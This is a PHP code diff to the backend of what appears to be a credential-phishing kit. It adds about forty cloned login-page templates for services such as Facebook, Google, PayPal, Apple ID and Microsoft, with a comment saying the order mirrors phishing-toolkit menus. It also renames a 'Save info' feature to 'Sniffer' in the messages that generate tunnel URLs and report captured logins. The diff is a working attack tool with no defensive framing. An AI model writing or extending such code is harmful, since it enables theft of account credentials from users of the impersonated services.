@@ -146,12 +146,49 @@ function read_saveinfo_config(string $baseDir): array
  */
 function saveinfo_templates_registry(): array
 {
+    // Order mirrors common phishing-toolkit menus; rich pages in saveinfo-templates/*.html.
     return [
-        'facebook' => ['label' => 'Facebook', 'file' => 'facebook.html'],
-        'facebook_followers' => ['label' => 'Facebook followers', 'file' => 'facebook_followers.html'],
         'instagram' => ['label' => 'Instagram', 'file' => 'instagram.html'],
+        'facebook' => ['label' => 'Facebook', 'file' => 'facebook.html'],
+        'snapchat' => ['label' => 'Snapchat', 'file' => 'snapchat.html'],
+        'twitter' => ['label' => 'Twitter / X', 'file' => 'twitter.html'],
+        'github' => ['label' => 'GitHub', 'file' => 'github.html'],
+        'google' => ['label' => 'Google', 'file' => 'google.html'],
+        'origin' => ['label' => 'Origin / EA', 'file' => 'origin.html'],
+        'yahoo' => ['label' => 'Yahoo', 'file' => 'yahoo.html'],
         'linkedin' => ['label' => 'LinkedIn', 'file' => 'linkedin.html'],
+        'protonmail' => ['label' => 'Protonmail', 'file' => 'protonmail.html'],
+        'wordpress' => ['label' => 'WordPress', 'file' => 'wordpress.html'],
+        'microsoft' => ['label' => 'Microsoft', 'file' => 'microsoft.html'],
+        'ig_followers' => ['label' => 'IG followers', 'file' => 'ig_followers.html'],
+        'pinterest' => ['label' => 'Pinterest', 'file' => 'pinterest.html'],
+        'apple_id' => ['label' => 'Apple ID', 'file' => 'apple_id.html'],
+        'verizon' => ['label' => 'Verizon', 'file' => 'verizon.html'],
+        'dropbox' => ['label' => 'Dropbox', 'file' => 'dropbox.html'],
+        'line' => ['label' => 'Line', 'file' => 'line.html'],
+        'shopify' => ['label' => 'Shopify', 'file' => 'shopify.html'],
+        'messenger' => ['label' => 'Messenger', 'file' => 'messenger.html'],
+        'gitlab' => ['label' => 'GitLab', 'file' => 'gitlab.html'],
+        'twitch' => ['label' => 'Twitch', 'file' => 'twitch.html'],
+        'myspace' => ['label' => 'MySpace', 'file' => 'myspace.html'],
+        'badoo' => ['label' => 'Badoo', 'file' => 'badoo.html'],
+        'vk' => ['label' => 'VK', 'file' => 'vk.html'],
+        'yandex' => ['label' => 'Yandex', 'file' => 'yandex.html'],
+        'deviantart' => ['label' => 'deviantART', 'file' => 'deviantart.html'],
+        'wifi' => ['label' => 'Wi‑Fi', 'file' => 'wifi.html'],
+        'paypal' => ['label' => 'PayPal', 'file' => 'paypal.html'],
+        'steam' => ['label' => 'Steam', 'file' => 'steam.html'],
+        'tiktok' => ['label' => 'TikTok', 'file' => 'tiktok.html'],
+        'playstation' => ['label' => 'PlayStation', 'file' => 'playstation.html'],
+        'ebay' => ['label' => 'eBay', 'file' => 'ebay.html'],
+        'amazon' => ['label' => 'Amazon', 'file' => 'amazon.html'],
+        'icloud' => ['label' => 'iCloud', 'file' => 'icloud.html'],
+        'spotify' => ['label' => 'Spotify', 'file' => 'spotify.html'],
         'netflix' => ['label' => 'Netflix', 'file' => 'netflix.html'],
+        'reddit' => ['label' => 'Reddit', 'file' => 'reddit.html'],
+        'stackoverflow' => ['label' => 'Stack Overflow', 'file' => 'stackoverflow.html'],
+        'custom' => ['label' => 'Custom', 'file' => 'custom.html'],
+        'facebook_followers' => ['label' => 'Facebook followers', 'file' => 'facebook_followers.html'],
         'default' => ['label' => 'Default', 'file' => 'default.html'],
     ];
 }
@@ -1498,7 +1535,7 @@ function handleSaveinfoStart(): void
             'payload_ok' => $gen['ok'],
             'template_slug' => $gen['template_slug'],
             'trap_file' => $gen['trap_file'] ?? null,
-            'message' => 'Using existing tunnel; Save info URL is ready.',
+            'message' => 'Using existing tunnel; Sniffer URL is ready.',
         ]);
 
         return;
@@ -1541,7 +1578,7 @@ function handleSaveinfoStart(): void
 
     echo json_encode([
         'status' => 'starting',
-        'message' => 'Tunnel starting... Poll /api.php?action=saveinfo_link for the Save info URL',
+        'message' => 'Tunnel starting... Poll /api.php?action=saveinfo_link for the Sniffer URL',
     ]);
 }
 
@@ -1554,7 +1591,7 @@ function handleSaveinfoLink(): void
         echo json_encode([
             'status' => 'forbidden',
             'link' => null,
-            'message' => 'No Save info session for your account. Click Generate on the Save info page first.',
+            'message' => 'No Sniffer session for your account. Open Sniffer and click Generate first.',
         ]);
 
         return;
@@ -1610,7 +1647,7 @@ function handleSaveinfoUpdatePayload(): void
 
     $config = reconcile_saveinfo_config_for_session($baseDir, read_saveinfo_config($baseDir));
     if (!saveinfo_config_owned_by_session($config)) {
-        echo json_encode(['status' => 'error', 'message' => 'Generate a Save info link first.']);
+        echo json_encode(['status' => 'error', 'message' => 'Generate a Sniffer link first.']);
 
         return;
     }
@@ -2146,7 +2183,7 @@ function handleTerminal(): void
         @unlink($loginNotify);
         $lines = array_filter(array_map('trim', explode("\n", (string) $raw)));
         foreach ($lines as $line) {
-            $events[] = ['type' => 'saved_login', 'content' => 'Login saved (UTC ' . $line . ') — see Save info'];
+            $events[] = ['type' => 'saved_login', 'content' => 'Login saved (UTC ' . $line . ') — see Sniffer'];
         }
     }
 
